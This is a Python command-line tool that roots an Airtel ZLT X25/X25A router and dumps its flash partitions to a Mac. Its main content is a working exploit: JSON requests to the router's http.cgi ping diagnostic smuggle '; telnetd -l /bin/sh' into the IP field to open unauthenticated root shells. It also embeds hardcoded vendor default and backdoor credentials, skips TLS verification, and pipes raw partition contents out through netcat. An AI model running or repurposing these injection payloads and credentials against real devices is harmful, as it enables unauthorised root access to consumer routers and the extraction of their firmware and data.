#!/usr/bin/env python3
"""
ZLT X25 / X25A (yocto_orca) Firmware Partition Dumper for macOS

Interactive Step-by-Step CLI with Multi-Vector Shell Access & RAM-Safe Extraction
"""

import hashlib
import json
import os
import re
import socket
import ssl
import sys
import threading
import time
import urllib.error
import urllib.request
from datetime import datetime
from pathlib import Path
from typing import Dict, List, Optional, Tuple

try:
    from rich import box
    from rich.align import Align
    from rich.console import Console
    from rich.panel import Panel
    from rich.progress import (
        BarColumn,
        DownloadColumn,
        Progress,
        SpinnerColumn,
        TextColumn,
        TimeRemainingColumn,
        TransferSpeedColumn,
    )
    from rich.prompt import Confirm, Prompt
    from rich.rule import Rule
    from rich.table import Table
except ImportError:
    print("\n[!] Missing required UI library 'rich'.")
    print("    Please install it first by running: pip install rich\n")
    sys.exit(1)

console = Console()

# ==============================================================================
# TELNET & RAW SOCKET CLIENT WITH IAC NEGOTIATION STRIPPING
# ==============================================================================

class RouterShellClient:
    """Manages raw TCP/Telnet shell communication with BusyBox telnetd."""

    IAC  = 255
    DONT = 254
    DO   = 253
    WONT = 252
    WILL = 251
    SB   = 250
    SE   = 240

    def __init__(self, host: str, port: int, timeout: float = 8.0):
        self.host    = host
        self.port    = port
        self.timeout = timeout
        self.sock: Optional[socket.socket] = None
        self._lock   = threading.Lock()

    def connect(self, credentials: List[Tuple[str, str]]) -> bool:
        """Connects to telnetd, handles IAC bytes, and authenticates if prompted."""
        try:
            self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.sock.settimeout(self.timeout)
            self.sock.connect((self.host, self.port))

            # Read initial banner or prompt
            time.sleep(0.4)
            banner = self._read_raw(timeout=2.0)

            # Check if a login prompt is presented
            if any(k in banner.lower() for k in ["login:", "username:", "user:"]):
                for user, pwd in credentials:
                    self._send_line(user)
                    time.sleep(0.4)
                    resp = self._read_raw(timeout=2.0)
                    if "password:" in resp.lower():
                        self._send_line(pwd)
                        time.sleep(0.6)
                        auth_check = self._read_raw(timeout=2.0)
                        if any(p in auth_check for p in ["#", "$", "/"]):
                            break
                    elif any(p in resp for p in ["#", "$", "/"]):
                        break

            # Verify command execution works
            test_out = self.exec_cmd("echo ZLT_READY_CHECK", timeout=4.0)
            return "ZLT_READY_CHECK" in test_out
        except Exception:
            self.close()
            return False

    def _strip_iac_and_reply(self, data: bytes) -> bytes:
        """Strips Telnet IAC sequences and replies WONT/DONT to keep session clean."""
        out     = bytearray()
        replies = bytearray()
        i = 0
        n = len(data)
        while i < n:
            b = data[i]
            if b == self.IAC:
                if i + 1 < n:
                    cmd = data[i + 1]
                    if cmd in (self.DO, self.DONT) and i + 2 < n:
                        opt = data[i + 2]
                        replies.extend([self.IAC, self.WONT, opt])
                        i += 3
                        continue
                    elif cmd in (self.WILL, self.WONT) and i + 2 < n:
                        opt = data[i + 2]
                        replies.extend([self.IAC, self.DONT, opt])
                        i += 3
                        continue
                    elif cmd == self.SB:
                        # Skip until IAC SE
                        i += 2
                        while i < n and data[i] != self.SE:
                            i += 1
                        i += 1
                        continue
                    else:
                        i += 2
                        continue
                else:
                    i += 1
            else:
                out.append(b)
                i += 1

        if replies and self.sock:
            try:
                self.sock.sendall(bytes(replies))
            except Exception:
                pass

        return bytes(out)

    def _send_line(self, line: str) -> None:
        if not self.sock:
            raise ConnectionError("Router shell socket is not connected.")
        self.sock.sendall((line + "\n").encode("utf-8"))

    def _read_raw(self, timeout: float = 2.0) -> str:
        if not self.sock:
            return ""
        self.sock.settimeout(timeout)
        chunks = []
        start  = time.time()
        while time.time() - start < timeout:
            try:
                raw = self.sock.recv(4096)
                if not raw:
                    break
                cleaned = self._strip_iac_and_reply(raw)
                chunks.append(cleaned.decode("utf-8", errors="ignore"))
                if len(raw) < 4096:
                    time.sleep(0.08)
            except socket.timeout:
                break
            except Exception:
                break
        return "".join(chunks)

    def exec_cmd(self, cmd: str, timeout: float = 15.0) -> str:
        """Executes a command synchronously using unique start/end markers."""
        with self._lock:
            if not self.sock:
                raise ConnectionError("Not connected to router shell.")

            # Drain any pending buffer
            self._read_raw(timeout=0.15)

            token    = f"__ZLT_{int(time.time() * 1000)}__"
            full_cmd = f"echo {token}_START; {cmd}; echo {token}_END:$?"
            self._send_line(full_cmd)

            buf        = ""
            start_time = time.time()
            self.sock.settimeout(1.0)

            while time.time() - start_time < timeout:
                try:
                    raw = self.sock.recv(8192)
                    if not raw:
                        break
                    cleaned  = self._strip_iac_and_reply(raw)
                    buf     += cleaned.decode("utf-8", errors="ignore")
                    if f"{token}_END:" in buf:
                        break
                except socket.timeout:
                    continue
                except Exception as e:
                    raise ConnectionError(f"Socket read error: {e}")

            # Extract text between markers
            pattern = re.compile(
                rf"{token}_START\r?\n(.*?){token}_END:(\d+)", re.DOTALL
            )
            match = pattern.search(buf)
            if match:
                output = match.group(1)
                # Strip echoed command lines if present
                clean_lines = [
                    line
                    for line in output.splitlines()
                    if token not in line and full_cmd not in line
                ]
                return "\n".join(clean_lines).strip()
            return buf.strip()

    def close(self) -> None:
        if self.sock:
            try:
                self.sock.close()
            except Exception:
                pass
            self.sock = None


# ==============================================================================
# HELPER FUNCTIONS FOR HTTP API, NETWORKING & PARTITION PARSING
# ==============================================================================

def get_local_mac_ip(router_ip: str) -> str:
    """Detects the Mac's local interface IP used to reach the router."""
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        s.connect((router_ip, 80))
        return s.getsockname()[0]
    except Exception:
        return "127.0.0.1"
    finally:
        s.close()


def check_http_cgi(router_ip: str, timeout: float = 4.0) -> Tuple[bool, str]:
    """Checks if the router's web interface and /cgi-bin/http.cgi are reachable."""
    for proto in ("http", "https"):
        url = f"{proto}://{router_ip}/"
        try:
            ctx = ssl._create_unverified_context() if proto == "https" else None
            req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"})
            with urllib.request.urlopen(req, timeout=timeout, context=ctx) as resp:
                if resp.status in (200, 301, 302):
                    return True, proto
        except urllib.error.HTTPError:
            # Even a 401/403/404 confirms the HTTP daemon is alive
            return True, proto
        except Exception:
            continue
    return False, "http"


def sanitize_session_id(raw_input: str) -> str:
    """Extracts clean alphanumeric sessionId from user paste."""
    s = raw_input.strip().strip("'").strip('"')
    if "sessionId=" in s:
        match = re.search(r"sessionId=([A-Za-z0-9_-]+)", s)
        if match:
            return match.group(1)
    if ":" in s:
        s = s.split(":")[-1].strip().strip("'").strip('"').rstrip(",")
    return s


def send_cgi_payload(
    proto: str, router_ip: str, payload: dict, session_id: str, timeout: float = 6.0
) -> Tuple[bool, str]:
    """Sends a JSON POST request to /cgi-bin/http.cgi."""
    url  = f"{proto}://{router_ip}/cgi-bin/http.cgi"
    data = json.dumps(payload).encode("utf-8")
    headers = {
        "Content-Type":      "application/json",
        "X-Requested-With":  "XMLHttpRequest",
        "Origin":            f"{proto}://{router_ip}",
        "Referer":           f"{proto}://{router_ip}/index.html",
        "Cookie":            f"sessionId={session_id}",
        "User-Agent":        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
    }
    try:
        ctx = ssl._create_unverified_context() if proto == "https" else None
        req = urllib.request.Request(url, data=data, headers=headers, method="POST")
        with urllib.request.urlopen(req, timeout=timeout, context=ctx) as resp:
            body = resp.read().decode("utf-8", errors="ignore")
            return True, body
    except Exception as e:
        return False, str(e)


def format_bytes(size: int) -> str:
    """Formats byte counts into human-readable KB / MB."""
    if size >= 1024 * 1024:
        return f"{size / (1024 * 1024):.2f} MB"
    elif size >= 1024:
        return f"{size / 1024:.1f} KB"
    return f"{size} B"


# ==============================================================================
# MAIN STEP-BY-STEP CLI WORKFLOW
# ==============================================================================

class ZLTFirmwareDumperCLI:

    def __init__(self):
        self.router_ip    = "192.168.1.1"
        self.proto        = "http"
        self.mac_ip       = "127.0.0.1"
        self.session_id   = ""
        self.shell: Optional[RouterShellClient] = None
        self.partitions: List[Dict] = []
        self.http_port    = 8088
        self.httpd_active = False
        self.default_creds = [
            ("root",          "admin"),
            ("admin",         "admin"),
            ("Gztz@83583#",   "83583000"),
            ("telecomadmin",  "nE7jA%5m"),
        ]

    def print_banner(self) -> None:
        console.clear()
        banner_text = (
            "[bold cyan]Airtel ZLT X25 / X25A Firmware Partition Extractor[/bold cyan]\n"
            "[dim]Target Architecture: Unisoc IVY510 (yocto_orca / UN3121A) • macOS Edition[/dim]"
        )
        console.print(
            Panel(
                Align.center(banner_text),
                box=box.DOUBLE_EDGE,
                border_style="bright_blue",
                padding=(1, 2),
            )
        )

    # --------------------------------------------------------------------------
    # STEP 1: TARGET DISCOVERY & NETWORK CHECK
    # --------------------------------------------------------------------------

    def step_1_network_discovery(self) -> None:
        console.print(Rule("[bold bright_blue]Step 1 of 5 • Network & Router Discovery[/bold bright_blue]"))

        while True:
            ip_input = Prompt.ask(
                "\n[bold]Enter your ZLT X25 Router IP address[/bold]",
                default=self.router_ip,
            )
            self.router_ip = ip_input.strip()

            with console.status(
                f"[cyan]Probing router web interface at {self.router_ip}...[/cyan]",
                spinner="dots",
            ):
                reachable, proto = check_http_cgi(self.router_ip)
                if not reachable and self.router_ip == "192.168.1.1":
                    # Auto-probe fallback IP 192.168.0.1
                    reachable_alt, proto_alt = check_http_cgi("192.168.0.1")
                    if reachable_alt:
                        self.router_ip = "192.168.0.1"
                        reachable, proto = True, proto_alt

            if reachable:
                self.proto  = proto
                self.mac_ip = get_local_mac_ip(self.router_ip)
                console.print(
                    f"  [bold green]✔[/bold green] Router reachable at [bold]{self.proto}://{self.router_ip}[/bold]"
                )
                console.print(
                    f"  [bold green]✔[/bold green] Mac Local LAN IP detected as [bold]{self.mac_ip}[/bold]\n"
                )
                return

            console.print(
                Panel(
                    f"[bold red]Cannot reach {self.router_ip}[/bold red]\n\n"
                    "1. Verify your Mac is connected to the Airtel ZLT X25 Wi-Fi or LAN port.\n"
                    "2. Disable any active VPN or custom proxy on macOS.\n"
                    "3. Check your router IP in [bold]System Settings → Wi-Fi → Details → TCP/IP (Router)[/bold].",
                    title="[red]Connection Error[/red]",
                    border_style="red",
                )
            )

            if not Confirm.ask("Try connecting again?", default=True):
                sys.exit(1)

    # --------------------------------------------------------------------------
    # STEP 2: SESSION ID ACQUISITION & VALIDATION
    # --------------------------------------------------------------------------

    def step_2_acquire_session(self) -> None:
        console.print(Rule("[bold bright_blue]Step 2 of 5 • Web Session Authentication[/bold bright_blue]"))

        # First check if a shell port is ALREADY open from a previous run
        with console.status("[cyan]Checking if root Telnet port is already open...[/cyan]"):
            for port in (4444, 4445, 23, 9876):
                client = RouterShellClient(self.router_ip, port, timeout=2.5)
                if client.connect(self.default_creds):
                    self.shell = client
                    console.print(
                        f"  [bold green]✔[/bold green] Existing root shell detected on port [bold]{port}[/bold]! Skipping injection.\n"
                    )
                    return

        instructions = (
            f"1. Open [bold cyan]{self.proto}://{self.router_ip}[/bold cyan] in Chrome or Safari and log in ([bold]admin[/bold] / [bold]admin[/bold]).\n"
            "2. Press [bold yellow]⌘ Command + ⌥ Option + I[/bold yellow] to open Developer Tools.\n"
            "3. Click the [bold]Network[/bold] tab and press [bold yellow]⌘ Command + R[/bold yellow] to reload.\n"
            "4. Click any [bold green]http.cgi[/bold green] request → click [bold]Payload[/bold] (or Request/Headers).\n"
            "5. Copy the [bold magenta]sessionId[/bold magenta] value and paste it below."
        )
        console.print(
            Panel(
                instructions,
                title="[bold cyan]How to Grab Your sessionId on macOS[/bold cyan]",
                border_style="cyan",
                padding=(1, 2),
            )
        )

        while True:
            raw_sid = Prompt.ask(
                "\n[bold]Paste your [magenta]sessionId[/magenta] (or press Enter to test stock ports only)[/bold]",
                default="",
            )
            cleaned = sanitize_session_id(raw_sid)

            if not cleaned:
                if Confirm.ask(
                    "[yellow]No sessionId entered. Skip web injection and only test stock Telnet ports (23/9876)?[/yellow]",
                    default=False,
                ):
                    self.session_id = ""
                    return
                continue

            if len(cleaned) < 8:
                console.print("[red]  ✘ That sessionId looks too short. Please copy the full alphanumeric string.[/red]")
                continue

            self.session_id = cleaned
            console.print(f"  [bold green]✔[/bold green] Sanitized sessionId: [bold magenta]{self.session_id[:12]}...[/bold magenta]\n")
            return

    # --------------------------------------------------------------------------
    # STEP 3: MULTI-VECTOR COMMAND INJECTION & SHELL CONNECTION
    # --------------------------------------------------------------------------

    def step_3_activate_root_shell(self) -> None:
        if self.shell:
            return

        console.print(Rule("[bold bright_blue]Step 3 of 5 • Root Shell Activation (Method A)[/bold bright_blue]"))

        while True:
            if self.session_id:
                injection_vectors = [
                    (
                        "Ping Injection (/bin/sh on port 4444)",
                        4444,
                        {
                            "enabled":    "1",
                            "ip":         "127.0.0.1 ; telnetd -l /bin/sh -p 4444",
                            "cmd":        172,
                            "method":     "POST",
                            "subcmd":     6,
                            "language":   "EN",
                            "sessionId":  self.session_id,
                        },
                    ),
                    (
                        "Ping Injection (/bin/ash on port 4445)",
                        4445,
                        {
                            "enabled":    "1",
                            "ip":         "127.0.0.1 ; telnetd -l /bin/ash -p 4445",
                            "cmd":        172,
                            "method":     "POST",
                            "subcmd":     6,
                            "language":   "EN",
                            "sessionId":  self.session_id,
                        },
                    ),
                    (
                        "Standard Telnet Daemon Injection (port 23)",
                        23,
                        {
                            "enabled":    "1",
                            "ip":         f"{self.router_ip} ; telnetd -l /bin/sh",
                            "cmd":        172,
                            "method":     "POST",
                            "subcmd":     6,
                            "language":   "EN",
                            "sessionId":  self.session_id,
                        },
                    ),
                ]

                for desc, target_port, payload in injection_vectors:
                    with console.status(f"[cyan]Triggering {desc}...[/cyan]", spinner="dots"):
                        ok, resp = send_cgi_payload(
                            self.proto, self.router_ip, payload, self.session_id
                        )
                        time.sleep(0.8)
                        client = RouterShellClient(self.router_ip, target_port, timeout=3.5)
                        if client.connect(self.default_creds):
                            self.shell = client
                            console.print(
                                f"  [bold green]✔[/bold green] Root shell established via [bold]{desc}[/bold]!"
                            )
                            self._print_system_banner()
                            return

            # Fallback: Probe standard ports (23, 9876, 4444, 4445)
            with console.status("[cyan]Probing fallback Telnet ports (23, 9876, 4444, 4445)...[/cyan]"):
                for port in (23, 9876, 4444, 4445):
                    client = RouterShellClient(self.router_ip, port, timeout=3.0)
                    if client.connect(self.default_creds):
                        self.shell = client
                        console.print(
                            f"  [bold green]✔[/bold green] Connected to router shell on port [bold]{port}[/bold]!"
                        )
                        self._print_system_banner()
                        return

            console.print(
                Panel(
                    "[bold red]Could not establish a Telnet shell session.[/bold red]\n\n"
                    "Possible causes:\n"
                    "• Your [bold]sessionId[/bold] expired (the router logs out idle web sessions quickly).\n"
                    "• Your firmware build requires enabling WAN/ping diagnostics first.\n"
                    "• Airtel's V4.6.0 build patched `cmd: 172` on this unit, requiring UART serial access.",
                    title="[red]Shell Activation Failed[/red]",
                    border_style="red",
                )
            )

            action = Prompt.ask(
                "Choose an action: [bold][R][/bold]etry with new sessionId, [bold][P][/bold]robe custom port, or [bold][Q][/bold]uit",
                choices=["r", "p", "q"],
                default="r",
            )

            if action == "q":
                sys.exit(1)
            elif action == "p":
                custom_port = int(Prompt.ask("Enter custom TCP Telnet port", default="23"))
                client = RouterShellClient(self.router_ip, custom_port, timeout=4.0)
                if client.connect(self.default_creds):
                    self.shell = client
                    self._print_system_banner()
                    return
                console.print(f"[red]  ✘ Could not connect on port {custom_port}.[/red]")
            else:
                self.step_2_acquire_session()

    def _print_system_banner(self) -> None:
        if not self.shell:
            return
        uname  = self.shell.exec_cmd("uname -a")
        tmp_df = self.shell.exec_cmd("df -h /tmp | tail -n 1")
        console.print(f"  [dim]Kernel:[/dim] [italic]{uname}[/italic]")
        console.print(f"  [dim]/tmp RAM Status:[/dim] {tmp_df}\n")

    # --------------------------------------------------------------------------
    # STEP 4: FLASH PARTITION & UBI VOLUME DISCOVERY
    # --------------------------------------------------------------------------

    def step_4_discover_partitions(self) -> None:
        console.print(Rule("[bold bright_blue]Step 4 of 5 • Flash Partition & UBI Volume Map[/bold bright_blue]"))
        assert self.shell is not None

        with console.status("[cyan]Reading /proc/mtd and UBI volumes from router...[/cyan]"):
            mtd_raw = self.shell.exec_cmd("cat /proc/mtd")
            ubi_raw = self.shell.exec_cmd(
                'for d in /sys/class/ubi/ubi0_*; do '
                '[ -e "$d/name" ] && echo "$(basename $d)|$(cat $d/usable_eb_size 2>/dev/null || echo 0)|$(cat $d/data_bytes 2>/dev/null || echo 0)|$(cat $d/name)"; '
                'done'
            )
            tmp_free_kb = self._get_tmp_free_kb()

        self.partitions = []

        # Parse /proc/mtd
        # Format: mtd0: 00080000 00020000 "splloader"
        mtd_pattern = re.compile(
            r"^(mtd\d+):\s+([0-9a-fA-F]+)\s+([0-9a-fA-F]+)\s+\"([^\"]+)\"",
            re.MULTILINE,
        )
        for match in mtd_pattern.finditer(mtd_raw):
            dev_name, size_hex, erasesize_hex, label = match.groups()
            size_bytes = int(size_hex, 16)
            safe_label = re.sub(r"[^A-Za-z0-9_.-]", "_", label)
            self.partitions.append(
                {
                    "index":      len(self.partitions) + 1,
                    "type":       "MTD",
                    "dev":        f"/dev/{dev_name}",
                    "id":         dev_name,
                    "name":       label,
                    "size_bytes": size_bytes,
                    "erasesize":  int(erasesize_hex, 16),
                    "filename":   f"{dev_name}_{safe_label}.bin",
                }
            )

        # Parse UBI volumes if present
        for line in ubi_raw.splitlines():
            parts = line.strip().split("|")
            if len(parts) == 4 and parts[0].startswith("ubi"):
                ubi_dev, _, data_bytes_str, vol_name = parts
                try:
                    size_bytes = int(data_bytes_str)
                except ValueError:
                    size_bytes = 0
                safe_label = re.sub(r"[^A-Za-z0-9_.-]", "_", vol_name)
                if size_bytes > 0:
                    self.partitions.append(
                        {
                            "index":      len(self.partitions) + 1,
                            "type":       "UBI",
                            "dev":        f"/dev/{ubi_dev}",
                            "id":         ubi_dev,
                            "name":       vol_name,
                            "size_bytes": size_bytes,
                            "erasesize":  0,
                            "filename":   f"{ubi_dev}_{safe_label}.bin",
                        }
                    )

        if not self.partitions:
            console.print("[bold red]✘ Failed to parse any partitions from /proc/mtd![/bold red]")
            console.print(f"[dim]Raw output:[/dim]\n{mtd_raw}")
            sys.exit(1)

        table = Table(
            title=f"Discovered Flash Partitions (Available /tmp RAM: {format_bytes(tmp_free_kb * 1024)})",
            box=box.ROUNDED,
            header_style="bold cyan",
        )
        table.add_column("#",              justify="right", style="bold")
        table.add_column("Type",           style="magenta")
        table.add_column("Device Node",    style="green")
        table.add_column("Partition Name", style="bold white")
        table.add_column("Size",           justify="right", style="yellow")
        table.add_column("Transfer Mode",  style="cyan")

        tmp_safe_limit = int(tmp_free_kb * 1024 * 0.80)
        for p in self.partitions:
            fits_ram = p["size_bytes"] <= tmp_safe_limit
            mode_str = (
                "[green]HTTP (/tmp RAM)[/green]"
                if fits_ram
                else "[bold yellow]Direct TCP Stream (Zero-RAM)[/bold yellow]"
            )
            table.add_row(
                str(p["index"]),
                p["type"],
                p["dev"],
                p["name"],
                format_bytes(p["size_bytes"]),
                mode_str,
            )

        console.print(table)
        console.print()

    def _get_tmp_free_kb(self) -> int:
        assert self.shell is not None
        out  = self.shell.exec_cmd("df -k /tmp | tail -n 1")
        nums = re.findall(r"\b(\d+)\b", out)
        # Standard df -k columns: blocks, used, available, use%
        if len(nums) >= 3:
            return int(nums[2])
        return 128 * 1024  # Fallback assumption: 128 MB

    # --------------------------------------------------------------------------
    # STEP 5: ONE-BY-ONE EXTRACTION WITH CHECKSUM VERIFICATION
    # --------------------------------------------------------------------------

    def step_5_dump_partitions(self) -> None:
        console.print(Rule("[bold bright_blue]Step 5 of 5 • RAM-Safe Extraction & Checksum Verification[/bold bright_blue]"))
        assert self.shell is not None

        selection = Prompt.ask(
            "Select partitions to dump: [bold][A][/bold]ll, [bold][M][/bold]TD only, or comma-separated numbers (e.g. [bold]1,2,3[/bold])",
            default="A",
        ).strip()

        if selection.upper() == "A":
            selected = self.partitions
        elif selection.upper() == "M":
            selected = [p for p in self.partitions if p["type"] == "MTD"]
        else:
            chosen_idx = {
                int(x.strip()) for x in selection.split(",") if x.strip().isdigit()
            }
            selected = [p for p in self.partitions if p["index"] in chosen_idx]

        if not selected:
            console.print("[yellow]No valid partitions selected. Exiting.[/yellow]")
            return

        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        out_dir   = Path.home() / "Downloads" / f"ZLT_X25_Firmware_Dump_{timestamp}"
        out_dir.mkdir(parents=True, exist_ok=True)

        console.print(f"\n  [bold green]✔[/bold green] Output directory created: [bold cyan]{out_dir}[/bold cyan]")

        # Start temporary BusyBox httpd on router for fast HTTP downloads
        self._start_router_httpd()

        results = []
        for idx, part in enumerate(selected, 1):
            console.print(
                f"\n[bold bright_white]({idx}/{len(selected)}) Processing [cyan]{part['dev']}[/cyan] "
                f"({part['name']} • {format_bytes(part['size_bytes'])})[/bold bright_white]"
            )

            # Clean any leftover temp files in /tmp first
            self.shell.exec_cmd("rm -f /tmp/zlt_dump_*.bin")

            free_kb    = self._get_tmp_free_kb()
            safe_bytes = int(free_kb * 1024 * 0.80)
            local_path = out_dir / part["filename"]

            success    = False
            local_md5  = ""
            remote_md5 = ""
            error_msg  = ""

            for attempt in range(1, 3):
                if attempt > 1:
                    console.print(f"  [yellow]↻ Retrying {part['dev']} (Attempt {attempt}/2)...[/yellow]")
                try:
                    if self.httpd_active and part["size_bytes"] <= safe_bytes:
                        success, local_md5, remote_md5 = self._dump_via_http(part, local_path)
                    else:
                        success, local_md5, remote_md5 = self._dump_via_tcp_stream(part, local_path)
                    if success:
                        break
                except Exception as e:
                    error_msg = str(e)
                    self.shell.exec_cmd("rm -f /tmp/zlt_dump_*.bin")

            if success:
                console.print(
                    f"  [bold green]✔ Verified![/bold green] Saved [bold]{part['filename']}[/bold] "
                    f"• MD5: [green]{local_md5}[/green]"
                )
                results.append({**part, "status": "OK", "md5": local_md5})
            else:
                console.print(
                    f"  [bold red]✘ Failed to dump {part['dev']}[/bold red]: "
                    f"{error_msg or 'Checksum or size mismatch'}"
                )
                results.append({**part, "status": "FAILED", "md5": "-"})

        # Cleanup router /tmp and stop temporary httpd
        self.shell.exec_cmd("rm -f /tmp/zlt_dump_*.bin")
        self._write_manifest_and_summary(out_dir, results)

    def _start_router_httpd(self) -> None:
        assert self.shell is not None
        with console.status("[cyan]Starting temporary BusyBox HTTP server on router (/tmp)...[/cyan]"):
            self.shell.exec_cmd(
                f"busybox httpd -p {self.http_port} -h /tmp || httpd -p {self.http_port} -h /tmp"
            )
            self.shell.exec_cmd("echo HTTPD_OK > /tmp/zlt_probe.txt")
            try:
                url = f"http://{self.router_ip}:{self.http_port}/zlt_probe.txt"
                with urllib.request.urlopen(url, timeout=3.0) as resp:
                    if b"HTTPD_OK" in resp.read():
                        self.httpd_active = True
            except Exception:
                self.httpd_active = False
            finally:
                self.shell.exec_cmd("rm -f /tmp/zlt_probe.txt")

        if self.httpd_active:
            console.print(
                f"  [bold green]✔[/bold green] Router HTTP transfer daemon active on port [bold]{self.http_port}[/bold]"
            )
        else:
            console.print(
                "  [yellow]ℹ[/yellow] BusyBox httpd unavailable; using Direct TCP Socket Streaming for all partitions."
            )

    def _dump_via_http(self, part: Dict, local_path: Path) -> Tuple[bool, str, str]:
        """Dumps partition to /tmp on router, downloads via HTTP with progress bar, and cleans /tmp."""
        assert self.shell is not None

        tmp_name = f"zlt_dump_{part['id']}.bin"
        tmp_path = f"/tmp/{tmp_name}"

        # Estimate timeout based on size (approx 2 MB/s flash read floor + 20s buffer)
        dd_timeout = max(30.0, (part["size_bytes"] / (1024 * 1024)) * 2.5 + 20.0)

        with console.status(
            f"[cyan]Dumping {part['dev']} to router RAM ({tmp_path})...[/cyan]",
            spinner="dots",
        ):
            self.shell.exec_cmd(f"dd if={part['dev']} of={tmp_path} bs=4096", timeout=dd_timeout)
            md5_out = self.shell.exec_cmd(f"md5sum {tmp_path}", timeout=dd_timeout)
            remote_md5_match = re.search(r"\b([0-9a-fA-F]{32})\b", md5_out)
            remote_md5 = remote_md5_match.group(1).lower() if remote_md5_match else ""

        url    = f"http://{self.router_ip}:{self.http_port}/{tmp_name}"
        hasher = hashlib.md5()

        try:
            with Progress(
                SpinnerColumn(),
                TextColumn("[progress.description]{task.description}"),
                BarColumn(bar_width=32),
                DownloadColumn(),
                TransferSpeedColumn(),
                TimeRemainingColumn(),
                console=console,
                transient=True,
            ) as progress:
                task = progress.add_task(
                    f"[cyan]Downloading {part['filename']}", total=part["size_bytes"]
                )
                with urllib.request.urlopen(url, timeout=30.0) as resp, open(
                    local_path, "wb"
                ) as out_file:
                    while True:
                        chunk = resp.read(65536)
                        if not chunk:
                            break
                        out_file.write(chunk)
                        hasher.update(chunk)
                        progress.update(task, advance=len(chunk))
        finally:
            # Always free router RAM immediately
            self.shell.exec_cmd(f"rm -f {tmp_path}")

        local_md5 = hasher.hexdigest().lower()

        if remote_md5 and local_md5 != remote_md5:
            raise ValueError(f"MD5 mismatch (Router: {remote_md5} vs Mac: {local_md5})")
        if local_path.stat().st_size == 0:
            raise ValueError("Downloaded file is 0 bytes")

        return True, local_md5, remote_md5

    def _dump_via_tcp_stream(self, part: Dict, local_path: Path) -> Tuple[bool, str, str]:
        """Streams partition directly from router dd -> Mac TCP socket without using /tmp RAM."""
        assert self.shell is not None

        server_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        server_sock.bind(("0.0.0.0", 0))
        listen_port = server_sock.getsockname()[1]
        server_sock.listen(1)
        server_sock.settimeout(12.0)

        hasher      = hashlib.md5()
        stream_err: List[str] = []

        def receiver_worker():
            try:
                conn, _ = server_sock.accept()
                conn.settimeout(30.0)
                with Progress(
                    SpinnerColumn(),
                    TextColumn("[progress.description]{task.description}"),
                    BarColumn(bar_width=32),
                    DownloadColumn(),
                    TransferSpeedColumn(),
                    TimeRemainingColumn(),
                    console=console,
                    transient=True,
                ) as progress:
                    task = progress.add_task(
                        f"[yellow]Streaming {part['filename']} (Zero-RAM)",
                        total=part["size_bytes"],
                    )
                    with open(local_path, "wb") as f:
                        while True:
                            data = conn.recv(65536)
                            if not data:
                                break
                            f.write(data)
                            hasher.update(data)
                            progress.update(task, advance=len(data))
                conn.close()
            except Exception as exc:
                stream_err.append(str(exc))
            finally:
                server_sock.close()

        recv_thread = threading.Thread(target=receiver_worker, daemon=True)
        recv_thread.start()

        stream_timeout = max(45.0, (part["size_bytes"] / (1024 * 1024)) * 3.5 + 30.0)
        self.shell.exec_cmd(
            f"dd if={part['dev']} bs=4096 2>/dev/null | nc {self.mac_ip} {listen_port} || "
            f"dd if={part['dev']} bs=4096 2>/dev/null | busybox nc {self.mac_ip} {listen_port}",
            timeout=stream_timeout,
        )

        recv_thread.join(timeout=15.0)

        if stream_err:
            raise ConnectionError(
                f"Direct TCP stream failed ({stream_err[0]}). Check macOS Firewall settings."
            )

        with console.status(f"[cyan]Computing router MD5 for {part['dev']}...[/cyan]"):
            md5_out = self.shell.exec_cmd(f"md5sum {part['dev']}", timeout=stream_timeout)
            remote_md5_match = re.search(r"\b([0-9a-fA-F]{32})\b", md5_out)
            remote_md5 = remote_md5_match.group(1).lower() if remote_md5_match else ""

        local_md5 = hasher.hexdigest().lower()

        if remote_md5 and local_md5 != remote_md5:
            raise ValueError(f"MD5 mismatch (Router: {remote_md5} vs Mac: {local_md5})")
        if not local_path.exists() or local_path.stat().st_size == 0:
            raise ValueError("Streamed file is empty.")

        return True, local_md5, remote_md5

    def _write_manifest_and_summary(self, out_dir: Path, results: List[Dict]) -> None:
        manifest_path = out_dir / "dump_manifest.json"
        md5_path      = out_dir / "checksums.md5"

        with open(manifest_path, "w", encoding="utf-8") as mf:
            json.dump(
                {
                    "router_ip":  self.router_ip,
                    "timestamp":  datetime.now().isoformat(),
                    "partitions": results,
                },
                mf,
                indent=2,
            )

        with open(md5_path, "w", encoding="utf-8") as cf:
            for r in results:
                if r["status"] == "OK":
                    cf.write(f"{r['md5']}  {r['filename']}\n")

        console.print()
        summary = Table(
            title="Firmware Extraction Summary Scorecard",
            box=box.ROUNDED,
            header_style="bold green",
        )
        summary.add_column("Device",       style="cyan")
        summary.add_column("File Name",    style="bold white")
        summary.add_column("Size",         justify="right", style="yellow")
        summary.add_column("MD5 Checksum", style="dim")
        summary.add_column("Status",       justify="center")

        for r in results:
            badge = (
                "[bold green]✔ VERIFIED[/bold green]"
                if r["status"] == "OK"
                else "[bold red]✘ FAILED[/bold red]"
            )
            summary.add_row(
                r["dev"],
                r["filename"],
                format_bytes(r["size_bytes"]),
                r["md5"],
                badge,
            )

        console.print(summary)
        console.print(
            Panel(
                f"All extracted `.bin` images, `checksums.md5`, and `dump_manifest.json` have been saved to:\n"
                f"[bold cyan]{out_dir}[/bold cyan]",
                title="[bold green]Dump Complete[/bold green]",
                border_style="green",
            )
        )

    def run(self) -> None:
        try:
            self.print_banner()
            self.step_1_network_discovery()
            self.step_2_acquire_session()
            self.step_3_activate_root_shell()
            self.step_4_discover_partitions()
            self.step_5_dump_partitions()
        except KeyboardInterrupt:
            console.print("\n\n[bold yellow]⚠ Interrupted by user. Cleaning up router /tmp...[/bold yellow]")
            if self.shell:
                try:
                    self.shell.exec_cmd("rm -f /tmp/zlt_dump_*.bin")
                except Exception:
                    pass
        finally:
            if self.shell:
                self.shell.close()


if __name__ == "__main__":
    ZLTFirmwareDumperCLI().run()
